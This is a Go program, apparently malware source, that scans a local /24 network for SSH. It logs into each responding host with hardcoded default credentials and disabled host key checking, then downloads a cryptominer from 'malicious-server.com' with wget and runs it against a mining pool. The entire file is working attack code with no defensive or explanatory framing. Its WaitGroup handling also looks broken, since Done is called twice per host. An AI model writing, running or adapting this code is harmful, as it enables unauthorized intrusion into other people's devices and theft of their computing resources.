package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const (
	payloadURL    = "http://malicious-server.com/miner-x86"
	sshPort       = "22"
	sshUser       = "admin"
	sshPass       = "admin123"
	networkPrefix = "192.168.1"
	concurrency   = 10
)

func scanHost(host string, results chan<- string) {
	conn, err := net.DialTimeout("tcp", host+":"+sshPort, 2*time.Second)
	if err != nil {
		return
	}
	conn.Close()
	results <- host
}

func deployPayload(host string, wg *sync.WaitGroup) {
	defer wg.Done()
	log.Printf("Attempting deployment to %s", host)

	// SSH command to download and execute payload
	cmd := fmt.Sprintf("wget -O /tmp/miner %s && chmod +x /tmp/miner && /tmp/miner --pool xmr.pool.com:3333 --user wallet --pass x", payloadURL)
	sshCmd := exec.Command("sshpass", "-p", sshPass, "ssh", "-o", "StrictHostKeyChecking=no", sshUser+"@"+host, cmd)

	output, err := sshCmd.CombinedOutput()
	if err != nil {
		log.Printf("Failed on %s: %v", host, err)
		return
	}
	log.Printf("Success on %s: %s", host, string(output))
}

func main() {
	log.Println("Starting IoT miner deployment scan...")
	results := make(chan string)
	var wg sync.WaitGroup

	// Scan for alive hosts with SSH open
	go func() {
		for i := 1; i <= 254; i++ {
			host := fmt.Sprintf("%s.%d", networkPrefix, i)
			wg.Add(1)
			go func(h string) {
				defer wg.Done()
				scanHost(h, results)
			}(host)
		}
		wg.Wait()
		close(results)
	}()

	// Deploy to discovered hosts
	var deployWg sync.WaitGroup
	semaphore := make(chan struct{}, concurrency)
	for host := range results {
		semaphore <- struct{}{}
		deployWg.Add(1)
		go func(h string) {
			defer deployWg.Done()
			deployPayload(h, &deployWg)
			<-semaphore
		}(host)
	}
	deployWg.Wait()
	log.Println("Deployment cycle completed.")
}